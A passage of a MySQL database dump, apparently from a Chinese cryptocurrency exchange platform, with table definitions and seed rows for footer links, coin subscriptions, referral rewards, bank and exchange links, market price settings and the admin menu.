  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `type` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_footer
-- ----------------------------
INSERT INTO `movesay_footer` VALUES ('1', '1', '关于我们', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('2', '1', '联系我们', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('3', '1', '资质证明', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('4', '1', '用户协议', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('5', '1', '法律声明', '/Article/index/type/aboutus.html', '', '1', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('6', '1', '1', '/', 'footer_1.png', '2', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('7', '1', '1', 'http://www.szfw.org/', 'footer_2.png', '2', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('8', '1', '1', 'http://www.miibeian.gov.cn/', 'footer_3.png', '2', '', '1', '111', '0', '1');
INSERT INTO `movesay_footer` VALUES ('9', '1', '1', 'http://www.cyberpolice.cn/', 'footer_4.png', '2', '', '1', '111', '0', '1');

-- ----------------------------
-- Table structure for `movesay_huafei`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_huafei`;
CREATE TABLE `movesay_huafei` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `userid` int(11) unsigned NOT NULL,
  `moble` varchar(255) NOT NULL,
  `num` int(11) unsigned NOT NULL,
  `type` varchar(50) NOT NULL,
  `mum` decimal(20,8) NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_huafei
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_huafei_coin`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_huafei_coin`;
CREATE TABLE `movesay_huafei_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `coinname` varchar(50) NOT NULL,
  `price` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_huafei_coin
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_huafei_type`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_huafei_type`;
CREATE TABLE `movesay_huafei_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `status` tinyint(4) NOT NULL COMMENT '状态',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_huafei_type
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_invit`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_invit`;
CREATE TABLE `movesay_invit` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `invit` int(11) unsigned NOT NULL,
  `name` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `invit` (`invit`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='推广奖励表';

-- ----------------------------
-- Records of movesay_invit
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_issue`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_issue`;
CREATE TABLE `movesay_issue` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `buycoin` varchar(50) NOT NULL,
  `num` bigint(20) unsigned NOT NULL,
  `deal` int(11) unsigned NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `limit` int(11) unsigned NOT NULL,
  `time` varchar(255) NOT NULL,
  `tian` varchar(255) NOT NULL,
  `ci` varchar(255) NOT NULL,
  `jian` varchar(255) NOT NULL,
  `min` varchar(255) NOT NULL,
  `max` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `invit_coin` varchar(50) NOT NULL,
  `invit_1` varchar(50) NOT NULL,
  `invit_2` varchar(50) NOT NULL,
  `invit_3` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='认购发行表';

-- ----------------------------
-- Records of movesay_issue
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_issue_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_issue_log`;
CREATE TABLE `movesay_issue_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(255) NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `buycoin` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` int(20) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `ci` int(11) unsigned NOT NULL,
  `jian` varchar(255) NOT NULL,
  `unlock` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='认购记录表';

-- ----------------------------
-- Records of movesay_issue_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_link`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_link`;
CREATE TABLE `movesay_link` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `mytx` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=23 DEFAULT CHARSET=utf8 COMMENT='常用银行地址';

-- ----------------------------
-- Records of movesay_link
-- ----------------------------
INSERT INTO `movesay_link` VALUES ('4', 'boc', 'BBTC', 'https://www.btcc.com/', 'img_56937003683ce.jpg', '', '', '0', '1452503043', '1476090198', '1');
INSERT INTO `movesay_link` VALUES ('5', 'abc', '农业银行', 'http://www.abchina.com/cn/', 'img_569370458b18d.jpg', '', '', '0', '1452503109', '0', '0');
INSERT INTO `movesay_link` VALUES ('6', 'bccb', '北京银行', 'http://www.bankofbeijing.com.cn/', 'img_569370588dcdc.jpg', '', '', '0', '1452503128', '0', '0');
INSERT INTO `movesay_link` VALUES ('8', 'ccb', '建设银行', 'http://www.ccb.com/', 'img_5693709bbd20f.jpg', '', '', '0', '1452503195', '0', '0');
INSERT INTO `movesay_link` VALUES ('9', 'ceb', '光大银行', 'http://www.bankofbeijing.com.cn/', 'img_569370b207cc8.jpg', '', '', '0', '1452503218', '0', '0');
INSERT INTO `movesay_link` VALUES ('10', 'cib', '兴业银行', 'http://www.cib.com.cn/cn/index.html', 'img_569370d29bf59.jpg', '', '', '0', '1452503250', '0', '0');
INSERT INTO `movesay_link` VALUES ('11', 'citic', '中信银行', 'http://www.ecitic.com/', 'img_569370fb7a1b3.jpg', '', '', '0', '1452503291', '0', '0');
INSERT INTO `movesay_link` VALUES ('12', 'cmb', '招商银行', 'http://www.cmbchina.com/', 'img_5693710a9ac9c.jpg', '', '', '0', '1452503306', '0', '0');
INSERT INTO `movesay_link` VALUES ('13', 'cmbc', '民生银行', 'http://www.cmbchina.com/', 'img_5693711f97a9d.jpg', '', '', '0', '1452503327', '0', '0');
INSERT INTO `movesay_link` VALUES ('14', 'comm', '交通银行', 'http://www.bankcomm.com/BankCommSite/default.shtml', 'img_5693713076351.jpg', '', '', '0', '1452503344', '0', '0');
INSERT INTO `movesay_link` VALUES ('16', 'gdb', 'TFC', 'transfercoin.org', 'img_56937154bebc5.jpg', '', '', '0', '1452503380', '1476240419', '0');
INSERT INTO `movesay_link` VALUES ('17', 'icbc', 'COINBASE', 'https://www.coinbase.com/', 'img_56937162db7f5.jpg', '', '', '0', '1452503394', '1476088071', '0');
INSERT INTO `movesay_link` VALUES ('19', 'psbc', 'AMP', 'https://bittrex.com/', 'img_5693717eefaa3.jpg', '', '', '0', '1452503422', '1476086694', '0');
INSERT INTO `movesay_link` VALUES ('20', 'spdb', 'BLK', 'https://poloniex.com/', 'img_5693718f1d70e.jpg', '', '', '0', '1452503439', '1476028800', '0');
INSERT INTO `movesay_link` VALUES ('21', 'szpab', 'BTC', 'https://bitcoin.org/en/', '56c2e4c9aff85.jpg', '', '', '0', '1455613129', '1476028800', '0');
INSERT INTO `movesay_link` VALUES ('22', '12', '12', '12', '', '', '', '0', '1476028800', '1476028800', '0');

-- ----------------------------
-- Table structure for `movesay_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_log`;
CREATE TABLE `movesay_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(50) NOT NULL,
  `name` varchar(255) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` int(20) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `unlock` int(11) unsigned NOT NULL,
  `ci` int(11) unsigned NOT NULL,
  `recycle` int(11) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_market`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_market`;
CREATE TABLE `movesay_market` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `round` varchar(255) NOT NULL,
  `fee_buy` varchar(255) NOT NULL,
  `fee_sell` varchar(255) NOT NULL,
  `buy_min` varchar(255) NOT NULL,
  `buy_max` varchar(255) NOT NULL,
  `sell_min` varchar(255) NOT NULL,
  `sell_max` varchar(255) NOT NULL,
  `trade_min` varchar(255) NOT NULL,
  `trade_max` varchar(255) NOT NULL,
  `invit_buy` varchar(50) NOT NULL,
  `invit_sell` varchar(50) NOT NULL,
  `invit_1` varchar(50) NOT NULL,
  `invit_2` varchar(50) NOT NULL,
  `invit_3` varchar(50) NOT NULL,
  `zhang` varchar(255) NOT NULL,
  `die` varchar(255) NOT NULL,
  `hou_price` varchar(255) NOT NULL,
  `tendency` varchar(1000) NOT NULL,
  `trade` int(11) unsigned NOT NULL,
  `new_price` decimal(20,8) unsigned NOT NULL,
  `buy_price` decimal(20,8) unsigned NOT NULL,
  `sell_price` decimal(20,8) unsigned NOT NULL,
  `min_price` decimal(20,8) unsigned NOT NULL,
  `max_price` decimal(20,8) unsigned NOT NULL,
  `volume` decimal(20,8) unsigned NOT NULL,
  `change` decimal(20,8) NOT NULL,
  `api_min` decimal(20,8) unsigned NOT NULL,
  `api_max` decimal(20,8) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COMMENT='行情配置表';

-- ----------------------------
-- Records of movesay_market
-- ----------------------------
INSERT INTO `movesay_market` VALUES ('13', 'pvc_usd', '3', '0.1', '0.1', '', '', '', '', '', '', '0', '0', '', '', '', '2', '0', '1.82300000', '[[1521456358,0],[1521470758,\"1.82000000\"],[1521485158,0],[1521499558,0],[1521513958,0],[1521528358,0],[1521542758,0],[1521557158,0],[1521571558,\"1.82300000\"],[1521585958,0],[1521600358,\"1.82000000\"],[1521614758,\"1.82300000\"],[1521629158,0],[1521643558,\"1.82800000\"],[1521657958,0],[1521672358,0],[1521686758,0],[1521701158,0],[1521715558,0]]', '1', '1.82500000', '0.00000000', '0.00000000', '1.81500000', '1.82800000', '25800.00000000', '0.11000000', '0.00000000', '0.00000000', '0', '0', '0', '0');
INSERT INTO `movesay_market` VALUES ('12', 'pvc_cny', '3', '0.1', '0.1', '', '', '', '', '', '', '0', '0', '', '', '', '0.5', '0', '', '', '1', '0.00000000', '0.00000000', '0.00000000', '0.00000000', '0.00000000', '0.00000000', '0.00000000', '0.00000000', '0.00000000', '0', '0', '0', '0');
INSERT INTO `movesay_market` VALUES ('14', 'ppc_usd', '3', '0.1', '0.1', '', '', '', '', '', '', '1', '1', '', '', '', '2', '0', '10.00000000', '[[1521941547,0],[1521955947,0],[1521970347,0],[1521984747,0],[1521999147,0],[1522013547,0],[1522027947,0],[1522042347,\"10.00000000\"],[1522056747,0],[1522071147,0],[1522085547,0],[1522099947,0],[1522114347,0],[1522128747,0],[1522143147,0],[1522157547,0],[1522171947,0],[1522186347,0],[1522200747,0]]', '1', '10.00000000', '0.00000000', '0.00000000', '10.00000000', '10.00000000', '20.00000000', '0.00000000', '0.00000000', '0.00000000', '0', '0', '0', '1');

-- ----------------------------
-- Table structure for `movesay_market_json`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_market_json`;
CREATE TABLE `movesay_market_json` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `data` varchar(500) COLLATE utf8_unicode_ci NOT NULL,
  `type` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=79 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- ----------------------------
-- Records of movesay_market_json
-- ----------------------------
INSERT INTO `movesay_market_json` VALUES ('69', 'pvc_usd', '', '', '0', '1518710399', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('70', 'pvc_usd', '[\"7201.00000000\",\"11814.93500000\",\"0.70000000\",\"0.70000000\"]', '', '0', '1518019199', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('71', 'pvc_usd', '[\"21243.00000000\",\"35086.90900000\",\"1.40000000\",\"1.40000000\"]', '', '0', '1518105599', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('72', 'pvc_usd', '[\"5004.50000000\",\"8304.87000000\",\"0.50000000\",\"0.50000000\"]', '', '0', '1518191999', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('73', 'pvc_usd', '[\"15244.00000000\",\"25310.47900000\",\"1.20000000\",\"1.20000000\"]', '', '0', '1518278399', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('74', 'pvc_usd', '[\"15923.00000000\",\"26443.25300000\",\"1.10000000\",\"1.10000000\"]', '', '0', '1518364799', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('75', 'pvc_usd', '[\"20441.00000000\",\"33951.70200000\",\"1.10000000\",\"1.10000000\"]', '', '0', '1518451199', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('76', 'pvc_usd', '[\"15802.00000000\",\"26249.50700000\",\"1.10000000\",\"1.10000000\"]', '', '0', '1518537599', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('77', 'pvc_usd', '[\"20352.02000000\",\"33921.03520000\",\"1.10000000\",\"1.10000000\"]', '', '0', '1518623999', '0', '0');
INSERT INTO `movesay_market_json` VALUES ('78', 'ppc_usd', '', '', '0', '147455999', '0', '0');

-- ----------------------------
-- Table structure for `movesay_menu`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_menu`;
CREATE TABLE `movesay_menu` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '文档ID',
  `title` varchar(50) NOT NULL DEFAULT '' COMMENT '标题',
  `pid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '上级分类ID',
  `sort` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '排序（同级有效）',
  `url` char(255) NOT NULL DEFAULT '' COMMENT '链接地址',
  `hide` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否隐藏',
  `tip` varchar(255) NOT NULL DEFAULT '' COMMENT '提示',
  `group` varchar(50) DEFAULT '' COMMENT '分组',
  `is_dev` tinyint(1) unsigned NOT NULL DEFAULT '0' COMMENT '是否仅开发者模式可见',
  `ico_name` varchar(50) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM AUTO_INCREMENT=449 DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC;

-- ----------------------------
-- Records of movesay_menu
-- ----------------------------
INSERT INTO `movesay_menu` VALUES ('1', '系统', '0', '1', 'Index/index', '0', '', '', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('2', '内容', '0', '1', 'Article/index', '0', '', '', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('3', '用户', '0', '1', 'User/index', '0', '', '', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('4', '财务', '0', '1', 'Finance/index', '0', '', '', '0', 'th-list');
INSERT INTO `movesay_menu` VALUES ('5', '交易', '0', '1', 'Trade/index', '0', '', '', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('6', '应用', '0', '1', 'Game/index', '0', '', '', '0', 'globe');
INSERT INTO `movesay_menu` VALUES ('7', '设置', '0', '1', 'Config/index', '0', '', '', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('8', '运营', '0', '1', 'Operate/index', '0', '', '', '0', 'share');
INSERT INTO `movesay_menu` VALUES ('9', '工具', '0', '1', 'Tools/index', '0', '', '', '0', 'wrench');
INSERT INTO `movesay_menu` VALUES ('10', '扩展', '0', '1', 'Cloud/index', '0', '', '', '0', 'tasks');
INSERT INTO `movesay_menu` VALUES ('11', '系统概览', '1', '1', 'Index/index', '0', '', '系统', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('12', '市场统计', '1', '3', 'Index/market', '0', '', '系统', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('13', '文章管理', '2', '1', 'Article/index', '0', '', '内容', '0', 'list-alt');
INSERT INTO `movesay_menu` VALUES ('14', '编辑添加', '13', '1', 'Article/edit', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('15', '修改状态', '13', '100', 'Article/status', '1', '', '内容', '0', 'home');
INSERT INTO `movesay_menu` VALUES ('16', '上传图片', '13', '2', 'Article/images', '0', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('18', '编辑', '17', '2', 'Adver/edit', '0', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('19', '修改', '17', '2', 'Adver/status', '0', '', '内容管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('21', '编辑', '20', '3', 'Chat/edit', '0', '', '聊天管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('22', '修改', '20', '3', 'Chat/status', '0', '', '聊天管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('23', '提示文字', '2', '1', 'Text/index', '0', '', '提示管理', '0', 'exclamation-sign');
INSERT INTO `movesay_menu` VALUES ('24', '编辑', '23', '1', 'Text/edit', '0', '', '提示管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('25', '修改', '23', '1', 'Text/status', '0', '', '提示管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('26', '用户管理', '3', '1', 'User/index', '0', '', '用户', '0', 'user');
INSERT INTO `movesay_menu` VALUES ('32', '确认转出', '26', '8', 'User/myzc_qr', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('34', '编辑', '33', '2', 'User/index_edit', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('35', '修改', '33', '2', 'User/index_status', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('37', '财产修改', '26', '3', 'Usercoin/edit', '0', '', '用户管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('39', '新增用户组', '38', '0', 'AuthManager/createGroup', '0', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('40', '编辑用户组', '38', '0', 'AuthManager/editgroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('41', '更新用户组', '38', '0', 'AuthManager/writeGroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('42', '改变状态', '38', '0', 'AuthManager/changeStatus', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('43', '访问授权', '38', '0', 'AuthManager/access', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('44', '分类授权', '38', '0', 'AuthManager/category', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('45', '成员授权', '38', '0', 'AuthManager/user', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('46', '成员列表授权', '38', '0', 'AuthManager/tree', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('47', '用户组', '38', '0', 'AuthManager/group', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('48', '添加到用户组', '38', '0', 'AuthManager/addToGroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('49', '用户组移除', '38', '0', 'AuthManager/removeFromGroup', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('50', '分类添加到用户组', '38', '0', 'AuthManager/addToCategory', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('51', '模型添加到用户组', '38', '0', 'AuthManager/addToModel', '1', '', '权限管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('53', '配置', '52', '1', 'Finance/config', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('55', '类型', '52', '1', 'Finance/type', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('56', '状态修改', '52', '1', 'Finance/type_status', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('60', '修改', '57', '3', 'Mycz/status', '1', '', '充值管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('61', '状态修改', '57', '3', 'Mycztype/status', '1', '', '充值管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('64', '状态修改', '62', '5', 'Mytx/status', '1', '', '提现管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('65', '取消', '62', '5', 'Mytx/excel', '1', '', '提现管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('66', '导入excel', '9', '5', 'Mytx/exportExcel', '1', '', '提现管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('68', '委托管理', '5', '1', 'Trade/index', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('69', '成交记录', '5', '2', 'Trade/log', '0', '', '交易', '0', 'stats');
INSERT INTO `movesay_menu` VALUES ('70', '修改状态', '68', '0', 'Trade/status', '1', '', '交易管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('71', '撤销挂单', '68', '0', 'Trade/chexiao', '1', '', '交易管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('74', '认购编辑', '72', '2', 'Issue/edit', '1', '', '认购管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('75', '认购修改', '72', '2', 'Issue/status', '1', '', '认购管理', '0', '0');
INSERT INTO `movesay_menu` VALUES ('79', '基本配置', '7', '1', 'Config/index', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('80', '短信配置', '7', '2', 'Config/moble', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('81', '客服配置', '7', '3', 'Config/contact', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('82', '银行配置', '79', '4', 'Config/bank', '0', '', '网站配置', '0', 'credit-card');
INSERT INTO `movesay_menu` VALUES ('83', '编辑', '82', '4', 'Config/bank_edit', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('85', '编辑', '84', '4', 'Coin/edit', '0', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('87', '状态修改', '84', '4', 'Coin/status', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('89', '编辑市场', '88', '4', 'Market/edit', '0', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('91', '状态修改', '88', '4', 'Config/market_add', '1', '', '', '0', '0');
INSERT INTO `movesay_menu` VALUES ('92', '图形验证码', '95', '7', 'Verify/code', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('93', '手机验证码', '95', '7', 'Verify/mobile', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('94', '邮件验证码', '95', '7', 'Verify/email', '1', '', '网站配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('95', '其他配置', '7', '6', 'Config/qita', '0', '', '设置', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('97', '推广配置', '8', '2', 'Invit/config', '1', '', '推广管理', '0', 'cog');
INSERT INTO `movesay_menu` VALUES ('101', '其他模块调用', '9', '4', 'Tools/invoke', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('102', '优化表', '9', '4', 'Tools/optimize', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('103', '修复表', '9', '4', 'Tools/repair', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('104', '删除备份文件', '9', '4', 'Tools/del', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('105', '备份数据库', '9', '4', 'Tools/export', '1', '', '其他', '0', '');
INSERT INTO `movesay_menu` VALUES ('106', '还原数据库', '9', '4', 'Tools/import', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('107', '导出数据库', '9', '4', 'Tools/excel', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('108', '导出Excel', '9', '4', 'Tools/exportExcel', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('109', '导入Excel', '9', '4', 'Tools/importExecl', '1', '', '其他', '0', '0');
INSERT INTO `movesay_menu` VALUES ('115', '图片', '111', '0', 'Shop/images', '0', '', '云购商城', '0', '0');
INSERT INTO `movesay_menu` VALUES ('116', '菜单管理', '7', '5', 'Menu/index', '1', '', '开发组', '0', 'list');
INSERT INTO `movesay_menu` VALUES ('117', '排序', '116', '5', 'Menu/sort', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('118', '添加', '116', '5', 'Menu/add', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('119', '编辑', '116', '5', 'Menu/edit', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('120', '删除', '116', '5', 'Menu/del', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('121', '是否隐藏', '116', '5', 'Menu/toogleHide', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('122', '是否开发', '116', '5', 'Menu/toogleDev', '0', '', '开发组', '0', '0');
INSERT INTO `movesay_menu` VALUES ('123', '导入文件', '7', '5', 'Menu/importFile', '1', '', '开发组', '0', 'log-in');
INSERT INTO `movesay_menu` VALUES ('124', '导入', '7', '5', 'Menu/import', '1', '', '开发组', '0', 'log-in');
INSERT INTO `movesay_menu` VALUES ('127', '用户登录', '3', '0', 'Login/index', '1', '', '用户配置', '0', '0');
INSERT INTO `movesay_menu` VALUES ('128', '用户退出', '3', '0', 'Login/loginout', '1', '', '用户配置', '0', '0');
